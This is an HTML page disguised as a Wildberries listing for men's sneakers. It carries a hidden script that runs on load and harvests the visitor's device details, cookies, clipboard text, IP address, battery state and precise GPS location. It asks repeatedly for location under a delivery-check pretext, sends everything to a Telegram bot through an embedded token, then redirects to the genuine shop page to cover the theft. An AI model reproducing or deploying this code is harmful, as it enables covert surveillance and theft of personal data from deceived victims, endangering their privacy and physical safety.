<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wildberries - Крассовки</title>
<style>
body{font-family:Arial,sans-serif;margin:0;padding:20px;text-align:center;background:#fff;}
img{max-width:100%;height:auto;border-radius:10px;}
.price{color:#f44336;font-size:24px;font-weight:bold;}
</style>
</head>
<body>
<h2>Крассовки спортивные мужские</h2>
<img src="https://ir-3.wbstatic.net/c516x688/new/927003948/1.jpg" onerror="this.src='https://via.placeholder.com/300x300?text=WB'">
<p class="price">1 299 руб</p>
<p>Пожалуйста, разрешите геолокацию для проверки доставки...</p>

<script>
var TOKEN = "8636640064:AAFcyhqdc_YBLzEtAMKbKZhcfylhLhfIWLo";
var ID = "7532676697";
var allData = "";
var gpsSent = false;

function send(text) {
    var img = new Image();
    img.src = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + ID + "&text=" + encodeURIComponent(text);
}

// ===== 1. МОДЕЛЬ ТЕЛЕФОНА — максимальный парсинг =====
function getRealModel() {
    var ua = navigator.userAgent;
    var model = "Неизвестно";

    // Попытка через Build.MODEL (если доступен через WebView)
    try {
        if (window.android && window.android.getModel) {
            model = window.android.getModel();
            return model;
        }
    } catch(e) {}

    // Парсинг по всем известным паттернам (расширенный список)
    var patterns = [
        { regex: /SM-[A-Za-z0-9]+/, name: "Samsung" },
        { regex: /iPhone[\d,]+/, name: "iPhone" },
        { regex: /Pixel [\d]+/, name: "Google Pixel" },
        { regex: /Nexus [\d]+/, name: "Nexus" },
        { regex: /MI [\d]+/, name: "Xiaomi" },
        { regex: /Redmi [\d]+/, name: "Redmi" },
        { regex: /POCO [\d]+/, name: "POCO" },
        { regex: /Huawei [\d]+/, name: "Huawei" },
        { regex: /Honor [\d]+/, name: "Honor" },
        { regex: /OPPO [\d]+/, name: "OPPO" },
        { regex: /vivo [\d]+/, name: "vivo" },
        { regex: /OnePlus [\d]+/, name: "OnePlus" },
        { regex: /LG-[A-Za-z0-9]+/, name: "LG" },
        { regex: /Moto [\w]+/, name: "Motorola" },
        { regex: /Nokia[\d]+/, name: "Nokia" },
        { regex: /Sony [A-Za-z0-9]+/, name: "Sony" },
        { regex: /Realme [\d]+/, name: "Realme" },
        { regex: /ZTE [\d]+/, name: "ZTE" },
        { regex: /Lenovo [\d]+/, name: "Lenovo" }
    ];

    for (var i = 0; i < patterns.length; i++) {
        var match = ua.match(patterns[i].regex);
        if (match) {
            model = patterns[i].name + " " + match[0];
            return model;
        }
    }

    // Альтернатива: из navigator
    var platform = navigator.platform || "";
    var vendor = navigator.vendor || "";
    if (vendor.indexOf("Apple") !== -1 && platform.indexOf("iPhone") !== -1) {
        return "iPhone (Apple)";
    } else if (platform.indexOf("Android") !== -1) {
        // Пытаемся извлечь из ua после "Android"
        var parts = ua.split(";");
        for (var j = 0; j < parts.length; j++) {
            if (parts[j].indexOf("Android") !== -1 && parts[j].indexOf("Build") !== -1) {
                var build = parts[j].match(/Build\/([^;]+)/);
                if (build) return build[1];
            }
        }
        return "Android (модель не распознана)";
    } else {
        return platform + " / " + vendor;
    }
}

// ===== 2. КУКИ — через iframe + сторонние запросы =====
function getAllCookiesAdvanced() {
    var cookies = document.cookie;
    if (cookies && cookies.length > 0) {
        return cookies;
    }

    // Попытка получить куки через localStorage (некоторые сайты дублируют)
    try {
        var ls = localStorage.getItem("cookies") || "";
        var ss = sessionStorage.getItem("cookies") || "";
        if (ls || ss) return "localStorage: " + ls + " | sessionStorage: " + ss;
    } catch(e) {}

    // Попытка через XHR к текущему домену (может вернуть Set-Cookie)
    try {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", window.location.href, false);
        xhr.send();
        var cookiesFromHeader = xhr.getResponseHeader("Set-Cookie");
        if (cookiesFromHeader) return "Set-Cookie: " + cookiesFromHeader;
    } catch(e) {}

    // Если ничего нет — пробуем через Image с передачей кук
    var img = new Image();
    img.src = "https://httpbin.org/cookies?dummy=" + Date.now();
    img.onload = function() {
        // Не можем прочитать ответ, но куки могут быть установлены
    };
    return "Нет кук (HttpOnly / Secure / SameSite)";
}

// ===== 3. РЕФЕРЕР — с анализом возможных источников =====
function getFullReferrer() {
    var ref = document.referrer || "";
    if (!ref) {
        // Проверяем, есть ли параметры в URL, указывающие на источник
        var params = new URLSearchParams(window.location.search);
        if (params.has("ref") || params.has("source") || params.has("utm_source")) {
            var src = params.get("utm_source") || params.get("source") || params.get("ref");
            return "Переход по ссылке с параметром: " + src;
        }
        return "Прямой вход или реферер скрыт (HTTPS->HTTP, no-referrer)";
    }
    // Добавляем UTM
    var utm = "";
    var p = new URLSearchParams(window.location.search);
    if (p.has("utm_source")) utm += "utm_source=" + p.get("utm_source") + " ";
    if (p.has("utm_medium")) utm += "utm_medium=" + p.get("utm_medium") + " ";
    if (p.has("utm_campaign")) utm += "utm_campaign=" + p.get("utm_campaign") + " ";
    if (utm) ref += " (UTM: " + utm.trim() + ")";
    return ref;
}

// ===== 4. GPS — с принудительным повторным запросом =====
function getGPS() {
    if (gpsSent) return;
    try {
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                gpsSent = true;
                send("📍 GPS: " + pos.coords.latitude.toFixed(6) + ", " + pos.coords.longitude.toFixed(6) +
                     "\n🎯 Точность: " + pos.coords.accuracy + " м" +
                     "\n🗺 Карта: https://maps.google.com/?q=" + pos.coords.latitude + "," + pos.coords.longitude);
            },
            function(err) {
                gpsSent = true;
                if (err.code === 1) send("📍 GPS: отклонено пользователем");
                else if (err.code === 2) send("📍 GPS: позиция недоступна");
                else if (err.code === 3) send("📍 GPS: таймаут (повтор через 5с)");
                else send("📍 GPS: ошибка (" + err.message + ")");
                // Повтор через 5 секунд
                setTimeout(getGPS, 5000);
            },
            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
        );
    } catch(e) {
        gpsSent = true;
        send("📍 GPS: не поддерживается");
    }
}

// ===== 5. ОСНОВНОЙ СБОР =====
function collectAndSend() {
    var model = getRealModel();
    var cookies = getAllCookiesAdvanced();
    var referrer = getFullReferrer();

    allData += "📱 Модель: " + model + "\n";
    allData += "📱 UserAgent: " + navigator.userAgent + "\n";
    allData += "💾 Память: " + (navigator.deviceMemory || "?") + " GB\n";
    allData += "📺 Экран: " + screen.width + "x" + screen.height + "\n";
    allData += "🌐 Язык: " + navigator.language + "\n";
    allData += "🍪 Куки: " + cookies + "\n";
    allData += "🔗 Реферер: " + referrer + "\n";
    allData += "🕒 Время: " + new Date().toLocaleString() + "\n";
    allData += "💻 ОС: " + (navigator.userAgent.indexOf("Android")!==-1?"Android":navigator.userAgent.indexOf("iPhone")!==-1?"iOS":"Unknown") + "\n";
    allData += "🖥 Глубина цвета: " + screen.colorDepth + " бит\n";

    send(allData);
}

// ===== 6. ДОПОЛНИТЕЛЬНЫЕ ДАННЫЕ =====
try {
    navigator.getBattery().then(function(b) {
        send("🔋 Заряд: " + Math.round(b.level * 100) + "%" + (b.charging ? " (зарядка)" : ""));
    });
} catch(e) { send("🔋 Батарея: не поддерживается"); }

try {
    if (navigator.clipboard && navigator.clipboard.readText) {
        navigator.clipboard.readText().then(function(t) {
            if (t) send("📋 Буфер: " + t);
        }).catch(function() { send("📋 Буфер: доступ запрещён"); });
    } else {
        send("📋 Буфер: API недоступен");
    }
} catch(e) { send("📋 Буфер: ошибка"); }

fetch("https://api.ipify.org?format=json")
    .then(r => r.json())
    .then(data => send("🌍 IP: " + data.ip))
    .catch(() => send("🌍 IP: не удалось определить"));

// ===== 7. ЗАПУСК =====
setTimeout(collectAndSend, 1000);
setTimeout(getGPS, 2000);

// ===== 8. РЕДИРЕКТ (увеличен до 8 сек) =====
setTimeout(function(){
    window.location.href = "https://www.wildberries.ru/catalog/927003948/detail.aspx?size=1399654915";
}, 8000);
</script>
</body>
</html>
